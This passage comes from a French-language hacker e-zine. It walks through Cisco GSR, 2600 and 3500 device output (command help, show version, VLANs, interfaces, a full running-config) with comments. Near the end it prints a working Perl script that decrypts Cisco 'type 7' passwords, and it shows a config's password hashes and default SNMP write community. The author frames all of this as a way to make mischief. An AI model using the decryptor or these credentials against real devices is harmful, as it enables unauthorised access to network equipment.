  mpls             MPLS commands
  mrinfo           Request neighbor and version information from a multicast
router
  mrm              IP Multicast Routing Monitor Test
  mstat            Show statistics after multiple multicast traceroutes
  mtrace           Trace reverse multicast path from destination to source
  name-connection  Name an existing network connection
  no               Disable debugging functions
  ping             Send echo messages // Similaire α /sbin/ping ou ping.exe
  ppp              Start IETF Point-to-Point Protocol (PPP)
  pwd              Display current working directory
  redundancy       redundancy control
  reload           Halt and perform a cold restart // En gros τa flush la mem
                   // pis τa la reload, sans flusher les users et etc
  rename           Rename a file
  restart          Restart Connection
  resume           Resume an active network connection
  rmdir            Remove existing directory
  rsh              Execute a remote command
  send             Send a message to other tty lines
  set              Set system parameter (not config)
  setup            Run the SETUP command facility
  show             Show running system information
  slip             Start Serial-line IP (SLIP)
  squeeze          Squeeze a filesystem
  systat           Display information about terminal lines
  telnet           Open a telnet connection
  terminal         Set terminal line parameters
  test             Test subsystems, memory, and interfaces
  traceroute       Trace route to destination
  tunnel           Open a tunnel connection // τa j'avoue j'l'ai pas essayΘ,
                                            // bien que τa m'intrigue
  undebug          Disable debugging functions (see also 'debug')
  undelete         Undelete a file
  upgrade          upgrade GSR rom image(s)
  verify           Verify a file
  where            List active connections
  which-route      Do OSI route table lookup and display results
  write            Write running configuration to memory, network, or terminal

2600:
AgelinaJolie#?
// plut⌠t la mΩme chose que le GSR
// (aprΦs tout Cisco run IOS sur toutes les machines..)
Exec commands:
  <1-99>           Session number to resume
  access-enable    Create a temporary Access-List entry
  access-profile   Apply user-profile to interface
  access-template  Create a temporary Access-List entry
  alps             ALPS exec commands
  archive          manage archive files
  audio-prompt     load ivr prompt
  bfe              For manual emergency modes setting
  call             Load IVR call application
  ccm-manager      Call Manager Application exec commands
  cd               Change current directory
  clear            Reset functions
  clock            Manage the system clock
  cns              CNS subsystem
  configure        Enter configuration mode
  connect          Open a terminal connection
  copy             Copy from one file to another
  debug            Debugging functions (see also 'undebug')
  delete           Delete a file
  dir              List files on a filesystem
  disable          Turn off privileged commands
  disconnect       Disconnect an existing network connection
  enable           Turn on privileged commands
  erase            Erase a filesystem
  exit             Exit from the EXEC
  help             Description of the interactive help system
  isdn             Run an ISDN EXEC command on a BRI interface
  lat              Open a lat connection
  lock             Lock the terminal
  login            Log in as a particular user
  logout           Exit from the EXEC
  microcode        microcode commands
  monitor          Monitoring different system events
  more             Display the contents of a file
  mpls             MPLS commands
  mpoa             MPOA exec commands
  mrinfo           Request neighbor and version information from a multicast
router
  mrm              IP Multicast Routing Monitor Test
  mstat            Show statistics after multiple multicast traceroutes
  mtrace           Trace reverse multicast path from destination to source
  name-connection  Name an existing network connection
  ncia             Start/Stop NCIA Server
  no               Disable debugging functions
  pad              Open a X.29 PAD connection
  ping             Send echo messages
  ppp              Start IETF Point-to-Point Protocol (PPP)
  pwd              Display current working directory
  radio            Radio commands
  reload           Halt and perform a cold restart
  rename           Rename a file
  restart          Restart Connection
  resume           Resume an active network connection
  rlogin           Open an rlogin connection
  rsh              Execute a remote command
  sdlc             Send SDLC test frames
  send             Send a message to other tty lines
  setup            Run the SETUP command facility
  show             Show running system information
  slip             Start Serial-line IP (SLIP)
  squeeze          Squeeze a filesystem
  start-chat       Start a chat-script on a line
  systat           Display information about terminal lines
  tarp             TARP (Target ID Resolution Protocol) commands
  tclquit          Quit Tool Comand Language  shell 
  tclsh            Tool Comand Language a shell // C'est weird τa, il l'avait
                   // pas sur le GSR suppose que τa la ΘtΘ installΘ pour 
                   // runner des scripts de config ou de quoi du genre..
  telnet           Open a telnet connection
  terminal         Set terminal line parameters
  test             Test subsystems, memory, and interfaces
  tn3270           Open a tn3270 connection
  traceroute       Trace route to destination
  tunnel           Open a tunnel connection
  udptn            Open an udptn connection
  undebug          Disable debugging functions (see also 'debug')
  upgrade          Upgrade firmware
  verify           Verify a file
  where            List active connections
  which-route      Do OSI route table lookup and display results
  write            Write running configuration to memory, network, or terminal
  x28              Become an X.28 PAD
  x3               Set X.3 parameters on PAD
  xremote          Enter XRemote mode

Switch 3500:
KirstenDunst#?
Exec commands:
  <1-99>           Session number to resume
  access-enable    Create a temporary Access-List entry
  access-template  Create a temporary Access-List entry
  archive          manage archive files
  cd               Change current directory
  clear            Reset functions
  clock            Manage the system clock
  cluster          cluster exec mode commands
  configure        Enter configuration mode
  connect          Open a terminal connection
  copy             Copy from one file to another
  debug            Debugging functions (see also 'undebug')
  delete           Delete a file
  dir              List files on a filesystem
  disable          Turn off privileged commands
  disconnect       Disconnect an existing network connection
  enable           Turn on privileged commands
  erase            Erase a filesystem
  exit             Exit from the EXEC
  format           Format a filesystem
  fsck             Fsck a filesystem
  help             Description of the interactive help system
  hw-module        Commands to manipulate a target module
  lock             Lock the terminal
  login            Log in as a particular user
  logout           Exit from the EXEC
  mkdir            Create new directory
  more             Display the contents of a file
  name-connection  Name an existing network connection
  no               Disable debugging functions
  ping             Send echo messages
  pwd              Display current working directory
  rcommand         Run command on remote switch
  reload           Halt and perform a cold restart
  rename           Rename a file
  resume           Resume an active network connection
  rmdir            Remove existing directory
  rsh              Execute a remote command
  send             Send a message to other tty lines
  session          Start remote console session
  set              Set system parameter (not config)
  setup            Run the SETUP command facility
  show             Show running system information
  systat           Display information about terminal lines
  telnet           Open a telnet connection
  terminal         Set terminal line parameters
  test             Test subsystems, memory, and interfaces
  traceroute       Trace route to destination
  tunnel           Open a tunnel connection
  udld             UDLD protocol commands
  undebug          Disable debugging functions (see also 'debug')
  verify           Verify a file
  vlan             Configure VLAN parameters
  vmps             VMPS actions
  where            List active connections
  write            Write running configuration to memory, network, or terminal


Bon lα jvas pas  toute vous paster les  sous-help.. ya quand mΩme  des limites.
Mais vous  voyez un  peu de quoi τa la d'l'air,  curieusement le GSR a moins de
commandes que le 2600. Bon, tant qu'α paster des choses en batch, je vais aussi
mettre  un  output  du  show  version  de  chaque  bΘcane.  Pour  recueillir de
l'information show est la commande α utiliser.
En passant ya BEAUCOUP de "show ?" sur un 2600 :

AngelinaJolie#show ?
  access-expression         List access expression
  access-lists              List access lists 
                            // Les ACL de la machine.. 
                            // peut Ωtre usefull pour voir qui peut se connecter
                            // ou pas
  accounting                Accounting data for active sessions
  adjacency                 Adjacent nodes
  aliases                   Display alias commands
  alps                      Alps information
  apollo                    Apollo network information
  appletalk                 AppleTalk information
  arap                      Show Appletalk Remote Access statistics
  arp                       ARP table 
                            // C cute τa ta toute la liste des 
                            // macadress qui sont pluggΘs sur tel et tel port.
  async                     Information on terminal lines used as router
                            interfaces
  backhaul-session-manager  Backhaul Session Manager information
  backup                    Backup status
  bgp                       BGP information 
                            // Un protocol de routing (voir mon autre article)
  bridge                    Bridge Forwarding/Filtering Database [verbose]
  bsc                       BSC interface information
  bstun                     BSTUN interface information
  buffers                   Buffer pool statistics
  c2600                     Show c2600 information
  call                      Show call
  caller                    Display information about dialup connections
  cca                       CCA information
  ccm-manager               Call Manager Application information
  cdapi                     CDAPI information
  cdp                       CDP information
  cef                       Cisco Express Forwarding
  class-map                 Show QoS Class Map
  clns                      CLNS network information
  clock                     Display the system clock
  cls                       DLC user information
  cns                       CNS subsystem
  compress                  Show compression statistics
  configuration             Contents of Non-Volatile memory
  connection                Show Connection
  context                   Show context information
  controllers               Interface controller status
  cops                      COPS information
  debugging                 State of each debugging option
  decnet                    DECnet information
  derived-config            Derived operating configuration
  dhcp                      Dynamic Host Configuration Protocol status
  diag                      Show diagnostic information for port
                            adapters/modules
  dial-peer                 Dial Plan Mapping Table for, e.g. VoIP Peers
  dialer                    Dialer parameters and statistics
  dialplan                  Voice telephony dial plan
  diffserv                  Differentiated services
  dlsw                      Data Link Switching information
  dnsix                     Shows Dnsix/DMDP information
  docsis                    Show DOCSIS
  drip                      DRiP DB
  dspu                      Display DSPU information
  dxi                       atm-dxi information
  entry                     Queued terminal entries
  environment               Environmental monitor statistics
  exception                 exception informations
  file                      Show filesystem information
  flash:                    display information about flash: file system
  frame-relay               Frame-Relay information
  fras                      FRAS Information
  fras-host                 FRAS Host Information
  gateway                   Show status of gateway
  history                   Display the session command history
  hosts                     IP domain-name, lookup style, nameservers, and host
                            table
  html                      HTML helper commands
  idb                       List of Hardware Interface Descriptor Blocks
  interfaces                Interface status and configuration
  ip                        IP information 
                            // dans ip ya d'autre sous-show, donc un show ip &                
                            // s'imposerais!
  ipv6                      IPv6 information
  ipx                       Novell IPX information
  isis                      IS-IS routing information
  kerberos                  Show Kerberos Values
  key                       Key information
  keymap                    Terminal keyboard mappings
  lat                       DEC LAT information
  line                      TTY line information
  llc2                      IBM LLC2 circuit information
  lnm                       IBM LAN manager
  local-ack                 Local Acknowledgement virtual circuits
  location                  Display the system location
  logging                   Show the contents of logging buffers
  memory                    Memory statistics
  mgcp                      Display Media Gateway Control Protocol information
  microcode                 show configured microcode for downloadable hardware
  modemcap                  Show Modem Capabilities database
  mpls                      MPLS information 
                            // encore un routing protocol! 
                            // aprΦs tout c't'un routeur ;-)
  mpoa                      MPOA show commands
  nbf                       NBF (NetBEUI) information
  ncia                      Native Client Interface Architecture
  netbios-cache             NetBIOS name cache contents
  node                      Show known LAT nodes
  ntp                       Network time protocol
  num-exp                   Number Expansion (Speed Dial) information
  parser                    Display parser information
  pas                       Port Adaptor Information
  pci                       PCI Information
  policy-map                Show QoS Policy Map
  ppp                       PPP parameters and statistics
  printers                  Show LPD printer information
  privilege                 Show current privilege level
  processes                 Active process statistics
  protocols                 Active network routing protocols
  qdm                       Show information about QoS Device Manager
  qllc                      Display qllc-llc2 and qllc-sdlc conversion
                            information
  queue                     Show queue contents
  queueing                  Show queueing configuration
  radius                    Shows radius information
  random-detect-group       display random-detetct group
  registry                  Function registry information
  reload                    Scheduled reload information
  rhosts                    Remote-host+user equivalences
  rif                       RIF cache entries
  rmon                      rmon statistics
  route-map                 route-map information
  rtpspi                    RTP Service Provider Interface
  rtr                       Response Time Reporter (RTR)
  rudpv1                    Rudpv1 information
  running-config            Current operating configuration
  saa                       Service Assurance Agent information
  sdllc                     Display sdlc - llc2 conversion information
  services                  LAT learned services
  sessions                  Information about Telnet connections
  sgbp                      SGBP group information
  sip-ua                    Show SIP User Agent
  smf                       Software MAC filter
  smrp                      Simple Multicast Routing Protocol(SMRP) information
  sna                       Display SNA host information
  snapshot                  Snapshot parameters and statistics
  snmp                      snmp statistics
  source-bridge             Source-bridge parameters and statistics
  spanning-tree             Spanning tree topology
  srcp                      Display SRCP Protocol information
  stacks                    Process stack utilization
  standby                   Hot standby protocol information
  startup-config            Contents of startup configuration
  stun                      STUN status and configuration
  subscriber                Display the wireless subscriber unit management
                            applications
  subscriber-policy         Subscriber policy
  subsys                    Show subsystem information
  tacacs                    Shows tacacs+ server statistics
  tarp                      TARP information
  tcp                       Status of TCP connections
  tdm                       TDM connection information
  tech-support              Show system information for Tech-Support
  template                  Template information
  terminal                  Display terminal configuration parameters
  tgrm                      Trunk Group Resource Mananger info
  time-range                Time range
  tn3270                    TN3270 settings
  traffic-shape             traffic rate shaping configuration
  translate                 Protocol translation information
  translation-rule          Show translation rule table
  ttycap                    Terminal capability tables
  users                     Display information about terminal lines
  vc-group                  Show VC Group
  version                   System hardware and software status
  vines                     VINES information
  vlans                     Virtual LANs Information
  voice                     Voice port configuration & stats
  voip                      Voice over Internet Protocol information
  vpdn                      VPDN information
  vtemplate                 Virtual Template interface information
  whoami                    Info on current tty line
  x25                       X.25 information
  x29                       X.29 information
  xns                       XNS information
  xremote                   XRemote statistics


Bon trΩve de plaisanterie, voici les fameux show version:

GSR:
JessicaAlba#show version
Cisco Internetwork Operating System Software
IOS (tm) GS Software (GSR-P-M), Version 12.0(18)ST, EARLY DEPLOYMENT RELEASE
SOFTWARE (fc1)
TAC Support: http://www.cisco.com/tac
Copyright (c) 1986-2001 by cisco Systems, Inc.
Compiled Thu 09-Jul-01 21:20 by jwell
Image text-base: 0x60010950, data-base: 0x6144A000

ROM: System Bootstrap, Version 11.2(20020206:174913) [sumisra-bfr112 182],
DEVELOPMENT SOFTWARE
BOOTLDR: GS Software (GSR-BOOT-M), Version 12.0(8)S, EARLY DEPLOYMENT RELEASE
SOFTWARE (fc1)

JessicaAlba uptime is 1 day, 3 hours, 45 minutes
System returned to ROM by reload at 12:24:15 EST Mon Nov 11 2002
System restarted at 18:24:22 EST Thu Jul 25 2002

System image file is "slot0:gsr-p-mz.120-18.ST.bin"

cisco 12416/GRP (R5000) processor (revision 0x05) with 262144K bytes of memory.
R5000 CPU at 200Mhz, Implementation 35, Rev 2.1, 512KB L2 Cache
Last reset from power-on

1 Route Processor Card
2 Clock Scheduler Cards
3 Switch Fabric Cards
1 OC48 POS controller (1 POS).
2 OC192 POS controllers (2 POS).
1 Three Port Gigabit Ethernet/IEEE 802.3z controller (3 GigabitEthernet).
1 Ethernet/IEEE 802.3 interface(s)
3 GigabitEthernet/IEEE 802.3 interface(s)
3 Packet over SONET network interface(s)
507K bytes of non-volatile configuration memory.

20480K bytes of Flash PCMCIA card at slot 0 (Sector size 128K).
8192K bytes of Flash internal SIMM (Sector size 256K).
Configuration register is 0x2102

Ouan ben on peut voir toute les interfaces, pis que finalement ya de la mΘmoire
flash en PCMCIA lα-dessus.. (je suppose que le OS est dessus, facile a upgrader
ou formatter).  Bon vu  que c'est  fatigant avoir  des pastes,  je vais  copier
seulement les lignes du 2600 qui sont diffΘrentes...

AngelinaJolie#show version
IOS (tm) C2600 Software (C2600-JS-M), Version 12.2(2)T1,  RELEASE SOFTWARE (fc2)
TAC Support: http://www.cisco.com/tac
Copyright (c) 1986-2001 by cisco Systems, Inc.

cisco 2621 (MPC860) processor (revision 0x200) with 60416K/5120K bytes of
memory.
M860 processor: part number 0, mask 49
Bridging software.
X.25 software, Version 3.0.0.
SuperLAT software (copyright 1990 by Meridian Technology Corp).
TN3270 Emulation software.
2 FastEthernet/IEEE 802.3 interface(s)
32K bytes of non-volatile configuration memory.
16384K bytes of processor board System flash (Read/Write)

On voit alors  que le processeur  du 2600 est  pas mal moins  fort.. et α moins
de mΘmoire. Bon, mΩme chose avec la switch :

KirstenDunst#show version
IOS (tm) C3500XL Software (C3500XL-C3H2S-M), Version 12.0(5.2)XU, MAINTENANCE
INTERIM SOFTWARE
Copyright (c) 1986-2000 by cisco Systems, Inc.

ROM: Bootstrap program is C3500XL boot loader

cisco WS-C3524-XL (PowerPC403) processor (revision 0x01) with 8192K/1024K bytes
of memory.
Processor board ID FAA0504F082, with hardware revision 0x00
Last reset from warm-reset

Processor is running Enterprise Edition Software
Cluster command switch capable
Cluster member switch capable
24 FastEthernet/IEEE 802.3 interface(s)
2 Gigabit Ethernet/IEEE 802.3 interface(s)

Encore plus minus.. faut dire qu'une  switch τa l'a moins d'affaires α gΘrer du
cotΘ  CPU..  c'est α  peine  si elle  garde  quelques affaires  en  mΘmoire. La
principale  diffΘrence  c'est   que  les   protocoles  de   routing  sont   pas
implΘmentΘs dans  la switch,  c'est τa  qui fait  toute la  diffΘrence dans  la
mΘmoire qu'on a de besoin et du CPU.

Bon asteure  que le  ezine pΦse  5000ko, allons-y  avec des  commandes qui font
quelque chose de plus poussΘ! heh

Mettons que je veux voir les vlans configurΘs sur la machine.. (α partir  d'ici
je tiens  compte que  vous avez  mΘmorisΘ ou  notΘ les  noms des chix avec  les
types de machine ;-)

JessicaAlba#show vlans

No Virtual LANs configured.


I guess que Jessica aime pas full les vlans..

AngelinaJolie#show vlans

Virtual LAN ID:  1 (IEEE 802.1Q Encapsulation)

   vLAN Trunk Interface:   FastEthernet0/0

 This is configured as native Vlan for the following interface(s) :
FastEthernet0/0

   Protocols Configured:   Address:              Received:        Transmitted:

Virtual LAN ID:  1281 (IEEE 802.1Q Encapsulation)

   vLAN Trunk Interface:   FastEthernet0/0.1281

   Protocols Configured:   Address:              Received:        Transmitted:
           IP              192.168.10.2                 0                4623

Virtual LAN ID:  31 (IEEE 802.1Q Encapsulation)

   vLAN Trunk Interface:   FastEthernet0/0.31

   Protocols Configured:   Address:              Received:        Transmitted:
           IP              192.168.31.8               128               10235
          CLNS                                         55                   0


oh oh qu'est-ce que je vois!
ben  oui,  Angelina a des  vlans de  configurΘs..  on voit  donc  une interface
FastEthernet(FA)  et des  sous-interfaces FA.  Car oui,  grΓce aux  merveilleux
vlan,  on peut  faire rouler  sur la  mΩme interface  plusieurs "instances"  du
router.. tout ce  qu'on a faire  c'est de mettre  τa dans un  vlan! Fantastique
non? si on regarde sur la switch c'est pas mal diffΘrent du router :

KirstenDunst#show vlan      
VLAN Name                             Status    Ports
---- -------------------------------- --------- -------------------------------
1    default                          active    Fa0/13, Fa0/14, Fa0/15, Fa0/16,
                                                Fa0/17, Fa0/18, Fa0/19, Fa0/20,
                                                Fa0/21, Fa0/22, Fa0/23, Fa0/24,
                                                Gi0/1
10   VL10                             active   
11   VL11                             active   
12   VLAN0012                         active   
13   VLAN0013                         active


Lorsque la switch a beaucoup de  ports, elle risque d'avoir beaucoup de vlans..
m'enfin c'est avec cette commande qu'on peut voir dans quel vlan est pluggΘ  un
port.. quand mΩme pseudo-pratique.  Sur la switch on  peut aussi savoir la  mac
address pluggΘ avec le port :

KirstenDunst#show mac-address-table
Dynamic Address Count:                 601
Secure Address Count:                  0
Static Address (User-defined) Count:   0
System Self Address Count:             49
Total MAC addresses:                   650
Maximum MAC addresses:                 8192
Non-static Address Table:
Destination Address  Address Type  VLAN  Destination Port
-------------------  ------------  ----  --------------------
0000.0301.0102       Dynamic          1  GigabitEthernet0/2
0000.0401.0102       Dynamic          1  GigabitEthernet0/2
0000.0501.0102       Dynamic          1  GigabitEthernet0/2
0000.5008.cc4d       Dynamic          1  FastEthernet0/24
0000.c0a8.0102       Dynamic        501  GigabitEthernet0/2
0000.c0a8.0202       Dynamic        502  GigabitEthernet0/2
0000.c0a8.0502       Dynamic        503  GigabitEthernet0/2
0001.0235.71d1       Dynamic          1  FastEthernet0/24


bon, la c'est  beau tout τa,  mais comment on  fait pour voir  les dΘtails  les
plus intimes de  chaque interfaces? et  bien c'est "show  interfaces" pour tout
les machines.. voici un sample de Jessica :

JessicaAlba#show interfaces
GigabitEthernet1/0 is up, line protocol is up // τa veut dire que le laser 
  // est ouvert, et que le routeur gΦre le port..
  Hardware is GigMac 3 Port GigabitEthernet, address is 0003.f00d.c001 (bia
  0003.f00d.c001) // BTW ce port la c'est dla fibre optique quand mΩme..
  Internet address is 192.176.17.120/24 // Le ip et le netmask de l'interface
  // 1500 c'est le MTU par dΘfaut, la Bandwidth (BW) est exprimΘ en KiloBITS,
  //  dans le cas de cette interface, il y en a un million
  //                            (1 gigabit/sec! d'ou le nom de l'interface..)
  MTU 1500 bytes, BW 1000000 Kbit, DLY 10 usec, rely 255/255, load 1/255
  Encapsulation ARPA, loopback not set
  Keepalive set (10 sec)
  Full-duplex mode, link type is force-up, media type is SX
  output flow-control is unsupported, input flow-control is off
  ARP type: ARPA, ARP Timeout 04:00:00
  Last input 00:00:08, output 00:00:00, output hang never
  Last clearing of "show interface" counters never
  Queueing strategy: fifo
  Output queue 0/40, 0 drops; input queue 0/75, 150 drops
  5 minute input rate 0 bits/sec, 0 packets/sec
  5 minute output rate 0 bits/sec, 0 packets/sec
     // bon lα pour ces stats lα je suis pas s√r si c'est un 5minutes ou depuis
     // le uptime.. mais vu que la machine avait juste 1 jour de uptime, et que
     // c'est une machine test, c'est s√rement depuis que le port est "up"...
     45094188 packets input, 3653684704 bytes, 0 no buffer
     Received 235909 broadcasts, 0 runts, 107781 giants, 0 throttles
     1273250 input errors, 0 CRC, 0 frame, 1273250 overrun, 0 ignored
     0 watchdog, 3526047 multicast, 0 pause input
     15685 packets output, 1227106 bytes, 0 underruns
     0 output errors, 0 collisions, 3 interface resets
     0 babbles, 0 late collision, 0 deferred
     14 lost carrier, 0 no carrier, 0 pause output
     0 output buffer failures, 0 output buffers swapped out
POS3/0 is down, line protocol is down // ╟a veut dire que le laser est pas
  // allumΘ, et qu'on s'en sert pas dans le routeur..
  Hardware is Packet over SONET  // SONET c'est le protocole qui marche avec la
  // fibre optique pis le PPP. On parle d'une OC48 ici, alors le MTU est a 4470
  //  (et ben!) pis la speed c'est 2,488 gigabits/sec!
  MTU 4470 bytes, BW 2488000 Kbit, DLY 100 usec, rely 255/255, load 1/255
  Encapsulation HDLC, crc 32, loopback not set
  Keepalive set (10 sec)
  Scramble disabled
  Last input never, output never, output hang never
  Last clearing of "show interface" counters never
  Queueing strategy: fifo
  Output queue 0/40, 0 drops; input queue 0/75, 0 drops
  5 minute input rate 0 bits/sec, 0 packets/sec
  5 minute output rate 0 bits/sec, 0 packets/sec
  // Vu que le port est "down" donc closed, on a pas d'infos sur ce qui passe
     0 packets input, 0 bytes, 0 no buffer
     Received 0 broadcasts, 0 runts, 0 giants, 0 throttles
              0 parity
     0 input errors, 0 CRC, 0 frame, 0 overrun, 0 ignored, 0 abort
     0 packets output, 0 bytes, 0 underruns
     0 output errors, 0 applique, 0 interface resets
     0 output buffer failures, 0 output buffers swapped out
     2 carrier transitions
POS4/0 is administratively down, line protocol is down /mΩme chose que l'autre
  Hardware is Packet over SONET
  Internet address is 2.2.2.2/30
  // OC192, mΩme MTU que le OC48, mais un ti peu plus de bandwidth
  // (en facteur multiplicateur bien sur haha ;-) avec 9,952 gigabits/sec!
  MTU 4470 bytes, BW 9 952 000 Kbit, DLY 100 usec, rely 255/255, load 1/255
  Encapsulation PPP, crc 32, loopback not set
  Keepalive set (10 sec)
  Scramble enabled
  LCP Closed
  Closed: IPCP, CDPCP
  Listen: TAGCP
  Last input 1d00h, output 1d00h, output hang never
  Last clearing of "show interface" counters never
  Queueing strategy: fifo
  Output queue 0/40, 0 drops; input queue 0/75, 0 drops
  5 minute input rate 0 bits/sec, 0 packets/sec
  5 minute output rate 0 bits/sec, 0 packets/sec
     1415 packets input, 22540 bytes, 0 no buffer
     Received 0 broadcasts, 6 runts, 2 giants, 0 throttles
              0 parity
     223 input errors, 215 CRC, 0 frame, 0 overrun, 0 ignored, 0 abort
     4602 packets output, 189336 bytes, 0 underruns
     0 output errors, 0 applique, 6 interface resets
     0 output buffer failures, 0 output buffers swapped out
     5 carrier transitions
Loopback0 is up, line protocol is up
  Hardware is Loopback
  Description: Used for loopback, this is fun.
  Internet address is 199.199.199.120/32
  MTU 1514 bytes, BW 8000000 Kbit, DLY 5000 usec, rely 255/255, load 1/255
  Encapsulation LOOPBACK, loopback not set
  Last input never, output never, output hang never
  Last clearing of "show interface" counters never
  Queueing strategy: fifo
  Output queue 0/0, 0 drops; input queue 0/75, 0 drops
  5 minute input rate 0 bits/sec, 0 packets/sec
  5 minute output rate 0 bits/sec, 0 packets/sec
     0 packets input, 0 bytes, 0 no buffer
     Received 0 broadcasts, 0 runts, 0 giants, 0 throttles
     0 input errors, 0 CRC, 0 frame, 0 overrun, 0 ignored, 0 abort
     0 packets output, 0 bytes, 0 underruns
     0 output errors, 0 collisions, 0 interface resets
     0 output buffer failures, 0 output buffers swapped out
Ethernet1 is up, line protocol is up // oui, c'est une plug ben normale...
  Hardware is 10/100 Ethernet, address is 0003.f00d.c3ff (bia 0003.f00d.c3ff)
  Description: interface for management // voila pkoi elle est normal, c'est
  // par cette interface qu'on se branche en telnet pour administrer la machine.
  Internet address is 10.10.12.44/16
  MTU 1500 bytes, BW 10000 Kbit, DLY 1000 usec, rely 255/255, load 1/255
  Encapsulation ARPA, loopback not set
  Keepalive set (10 sec)
  ARP type: ARPA, ARP Timeout 04:00:00
  Last input 00:00:00, output 00:00:02, output hang never
  Last clearing of "show interface" counters never
  Queueing strategy: fifo
  Output queue 0/40, 0 drops; input queue 0/75, 1359 drops
  5 minute input rate 2000 bits/sec, 3 packets/sec
  5 minute output rate 0 bits/sec, 0 packets/sec
     697969 packets input, 70764617 bytes, 0 no buffer
     Received 680547 broadcasts, 0 runts, 0 giants, 0 throttles
     0 input errors, 4323 CRC, 0 frame, 536 overrun, 0 ignored
     0 input packets with dribble condition detected
     16532 packets output, 1680846 bytes, 0 underruns
     2 output errors, 6 collisions, 2 interface resets
     0 babbles, 2 late collision, 31 deferred
     4 lost carrier, 0 no carrier
     0 output buffer failures, 0 output buffers swapped out


Bon, Θvidemment j'en ai  enlevΘ un peu, il  avait d'autres Gigabit et  des POS!
Elle est bourrΘe  cette Jessica :-)  Il est aussi  α noter que  le router Θtait
dans un environnement de test, donc  il n'Θtait pas vraiment sur Internet..  ce
qui explique les IPs de LAN 192.*, mais il y a rien qui change entre un LAN  ou
Internet... α part les  IPs. De plus vous  avez vu de la  speed en bits, et  du
transfert en bytes, c'est fuckΘ j'avoue. En thΘorie on serait supposΘ  toujours
utiliser des  bits, mais  les bytes  sont ce  que vous  comprennez.. donc  pour
arranger la polΘmique du OC192, si  on prend le 9,952 gigabits/sec et  qu'on le
met en gigabytes/sec, τa donne 1,244. Et oui, 1,244 gig/sec comme on dirait par
chez nous sur Internet.. heh.
Aussi, une autre commande pour les voyeurs pourrait Ωtre trΦs intΘressante :

JessicaAlba# show run
Building configuration...

Current configuration : 3017 bytes
!
! Last configuration change at 01:15:25 EST Fri Nov 23 2002
!
version 12.0
no service pad
service timestamps debug datetime localtime
service timestamps log datetime localtime
service password-encryption
!
hostname JessicaAlba
!
boot system flash gsr-p-mz.120-18.ST.bin
logging rate-limit console 10 except errors
enable secret 5 $1$EvGk$ilJKqn3ajrEDfCKFU7x5C0
enable password 7 110A1016141D // τa j'en parle plus bas
!
clock timezone EST -5
clock summer-time EST recurring
!
!
interface Loopback0
 description Used for loopback, this is fun.
 ip address 200.200.200.6 255.255.255.255
!
interface FastEthernet0/0
 no ip address
 speed 100
 full-duplex
!
interface FastEthernet0/0.130 // La il faut que j'explique le .130. En faite
 // cette interface n'existe pas vraiment, c'est une interface virtuelle.
 // 0/0 existe, et est la FastEthernet α la slot 0 dans le rack 0, mais le
 // .130 α ΘtΘ dΘterminΘ dans la configuration. ╟a sert seulement pour les
 // interfaces Ehternet, α cause que ce sont les seules α supporter les vlans
 // (PPP ya pas de vlan dans τa, c'est pluggΘ direct).
 encapsulation dot1Q 130 // Voici donc le dot1Q (aka le VLAN) associΘ.
 // Vous comprenez donc que le .130 α juste ΘtΘ mis la pour se retrouver dans
 // les VLANS.. je sais pas par coeur le max qu'on peut mettre sur les Ciscos,
 // mais c'est beaucoup (>100 au moins).
 ip address 113.100.1.6 255.255.255.0
!
interface FastEthernet0/0.133
 encapsulation dot1Q 133
 ip address 113.100.4.6 255.255.255.0
 ip ospf cost 100 // Config de protocole
!
interface FastEthernet0/1
 description interface for management 
 ip address 10.10.12.41 255.255.0.0
 speed 100
 full-duplex
!
ip classless
ip route 10.0.0.0 255.0.0.0 10.10.0.1 // ╟a c'est des routes statiques de settΘes
ip route 100.100.0.0 255.255.255.0 Null0
ip route 100.100.1.0 255.255.255.0 Null0
ip route 100.100.2.0 255.255.255.0 Null0
no ip http server // Me semble que τa cΘ pour la configuration HTTP du routeur..
!
!
!
! // SNMP : Simple Network Management Protocol (τa s'explique tout seul heh)
snmp-server community public RO
snmp-server community private RW
snmp-server manager
!
dial-peer cor custom
!
!
!
!
! // τa cΘ juste des config pour les terminaux de configurations..
line con 0
line aux 0
line vty 0 4
 exec-timeout 0 0
 password 7 02050D480809
 login
line vty 5 10
 exec-timeout 0 0
 password 7 02050D480809
 login
line vty 11 15
 exec-timeout 0 0
 login
! // NTP: Network Time Protocol (me semble)
ntp clock-period 17180497
ntp server 10.10.12.37
!
end

Avec τa on voit tout ce qui a ΘtΘ settΘ sur le router/la switch..
IntΘressent...
Mais bon, c'est bien le fun faire le voyeur comme τa, faudrait Ωtre capable  de
regarder des choses plus  prΘcises, et surtout faire  de la marde! heu  je veux
dire configurer des choses qui pourrait nous Ωtre utile... ;-)

Bon la  jsuis sure  que mΩme  si vous  avez aucune  idΘe de  quoi faire avec un
router, vous avez quand mΩme rester figΘ sur :
             enable secret 5 $1$EvGk$ilJKqn3ajrEDfCKFU7x5C0
             enable password 7 110A1016141D
C'est Θvidant!
Bon, α ce que j'ai pu comprendre le "secret" c'est le premier password demandΘ,
pis le "password"  c'est celui qui  est demandΘ aprΦs  "enable".. c'est bizzare
car  sur le  routeur que  j'ai entre  les mains  prΘsentement le  secret et  le
password sont  les mΩmes...  pourtant l'explication  est simple  : l'algorithme
utilisΘ est pas la mΩme. Selon  cisco le password c'est un algorithme  fifi, et
on peut trouver un crack sur internet.

[.. 20 secondes plus tard ..]

#!/usr/bin/perl -w
#
# Credits for orginal code and description hobbit@avian.org,
# SPHiXe, .mudge et al. and for John Bashinski 
# for Cisco IOS password encryption facts.
#
# Use for any malice or illegal purposes strictly prohibited!
#

@xlat = ( 0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41,
          0x2c, 0x2e, 0x69, 0x79, 0x65, 0x77, 0x72, 0x6b, 0x6c,
          0x64, 0x4a, 0x4b, 0x44, 0x48, 0x53 , 0x55, 0x42 );

while (<>) {
        if (/(password|md5)\s+7\s+([\da-f]+)/io) {
            if (!(length($2) & 1)) {
                $ep = $2; $dp = "";
                ($s, $e) = ($2 =~ /^(..)(.+)/o);
                for ($i = 0; $i < length($e); $i+=2) {
                    $dp .= sprintf "%c",hex(substr($e,$i,2))^$xlat[$s++];
                }
                s/7\s+$ep/$dp/;
            }
        }
        print;
}

hum, j'aime pas la maniΦre qu'on s'en sert.. j'vas modifier τa un peu..

[.. 20 secondes plus tard! haha joke τa ma prit un bon 10min ak le debugage ..]

-------------------- >8 cut here --------------------

#!/usr/bin/perl -w
# chisco.pl : dΘcrypte les password "type 7" de Cisco IOS.
# Refaite vite vite par LastCall_ pour Mindkind 11

# Credits for orginal code and description hobbit@avian.org,
# SPHiXe, .mudge et al. and for John Bashinski 
